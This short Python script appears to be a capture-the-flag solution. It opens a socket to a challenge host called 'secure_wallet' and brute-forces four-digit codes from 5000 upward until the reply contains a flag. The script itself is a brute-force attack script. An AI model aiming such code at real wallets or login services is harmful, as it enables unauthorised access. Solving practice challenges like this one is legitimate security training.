import sys
import socket
import time


challenge_hostname = "secure_wallet.ctf.fifthdoma.in"
challenge_port = 2261

def decode_message(m):
    return m.decode("utf-8")

def encode_message(m):
    return m.encode("utf-8")

# Connect to challenge
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((challenge_hostname,challenge_port))
# Recieve first message
data= decode_message(sock.recv(1024))

for i in range(5000,5999):
    if data.find("flag") > 0:
        print(data)
        exit(0)
    if i % 100 == 0:
        print(i)
    sock.send(bytes(str(i),'ascii'))
    sock.send(b'\n')
    data = decode_message(sock.recv(1024))
